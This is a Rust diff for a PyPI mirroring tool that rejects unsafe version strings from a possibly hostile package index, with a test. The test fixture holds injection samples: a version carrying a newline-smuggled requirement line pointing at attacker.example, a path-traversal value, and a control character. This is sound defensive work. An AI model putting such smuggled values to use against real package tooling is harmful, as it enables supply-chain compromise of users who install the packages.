@@ -14,6 +14,7 @@
 
 use std::collections::HashMap;
 
+use ocx_lib::log;
 use serde::Deserialize;
 
 use super::VersionInfo;
@@ -60,6 +61,27 @@ pub async fn list_versions(package: &str, index: Option<&str>) -> anyhow::Result
     let mut versions = Vec::with_capacity(project.releases.len());
     for (version, files) in project.releases {
         if files.is_empty() || files.iter().all(|file| file.yanked) {
+            continue;
+        }
+        // Trust boundary: `releases` keys are attacker-controlled when
+        // `source.index` points at a hostile/compromised Warehouse index. The
+        // version string is later piped verbatim into `uv pip compile -` stdin
+        // as `{package}=={version}` — a newline smuggles a second requirement
+        // line ("evil @ https://attacker/…") that resolves, hash-self-verifies
+        // against the attacker's own bytes, and publishes under the legit tag;
+        // the same string also joins a filesystem path for the derived lock.
+        // Reject any version carrying whitespace, a control char, or a path
+        // separator BEFORE it reaches either sink. This is orthogonal to PEP
+        // 440 parseability: a weird-but-safe scheme still mirrors — only
+        // dangerous characters are rejected, never "doesn't parse".
+        if let Some(bad) = version
+            .chars()
+            .find(|ch| ch.is_whitespace() || ch.is_control() || *ch == '/' || *ch == '\\')
+        {
+            log::warn!(
+                "dropping PyPI release with unsafe version string {version:?} (contains {bad:?}); \
+                 a hostile index cannot smuggle a requirement line or path traversal through it"
+            );
             continue;
         }
         // Real upstream versions are PEP 440, not the mirror's own semver-ish
@@ -177,6 +199,61 @@ mod tests {
         assert!(!names.contains(&"1.1.0"), "yanked release must be dropped");
         assert!(!names.contains(&"0.9.0"), "fileless release must be dropped");
         assert!(versions.iter().all(|v| v.assets.is_empty()));
+    }
+
+    #[tokio::test]
+    async fn list_versions_rejects_versions_with_injection_or_traversal_characters() {
+        // BLOCK-tier supply-chain guard: `releases` keys are attacker-
+        // controlled when `source.index` points at a hostile/compromised
+        // Warehouse index. The version string is later piped VERBATIM into
+        // `uv pip compile -` stdin as `{package}=={version}` — a newline
+        // smuggles a second requirement line ("evil @ https://attacker/...")
+        // that resolves, hash-self-verifies, and publishes under the legit
+        // tag. The same string also feeds the derived-lock path join. Reject
+        // whitespace, control chars, and path separators at this trust
+        // boundary; everything downstream consumes this function's output.
+        install_crypto_provider();
+        let evil_json = r#"{
+            "releases": {
+                "1.0.0": [
+                    {"filename": "pkg-1.0.0-py3-none-any.whl", "yanked": false}
+                ],
+                "1.0.1\nevil @ https://attacker.example/evil.whl": [
+                    {"filename": "pkg-1.0.1-py3-none-any.whl", "yanked": false}
+                ],
+                "1.0.2/../../../etc": [
+                    {"filename": "pkg-1.0.2-py3-none-any.whl", "yanked": false}
+                ],
+                "1.0.3\u0007": [
+                    {"filename": "pkg-1.0.3-py3-none-any.whl", "yanked": false}
+                ],
+                "2024.01.01.post1+local": [
+                    {"filename": "pkg-2024-py3-none-any.whl", "yanked": false}
+                ]
+            }
+        }"#;
+        let body = Box::leak(ok_response(evil_json).into_boxed_str());
+        let (index, server) = spawn_index(body).await;
+
+        let versions = list_versions("pkg", Some(&index)).await.unwrap();
+        server.await.unwrap();
+
+        let names: Vec<&str> = versions.iter().map(|v| v.version.as_str()).collect();
+        assert!(names.contains(&"1.0.0"), "safe version must survive: {names:?}");
+        // Fail-open axis preserved: weird-but-safe version schemes (even ones
+        // ocx_lib::Version cannot parse) still mirror — only DANGEROUS
+        // characters are rejected, not "doesn't parse".
+        assert!(
+            names.contains(&"2024.01.01.post1+local"),
+            "unparseable-but-safe version must survive: {names:?}"
+        );
+        assert_eq!(names.len(), 2, "all dangerous versions must be dropped: {names:?}");
+        assert!(
+            !names
+                .iter()
+                .any(|n| n.contains('\n') || n.contains('/') || n.contains('\u{7}')),
+            "no dangerous character may reach downstream consumers: {names:?}"
+        );
     }
 
     #[tokio::test]
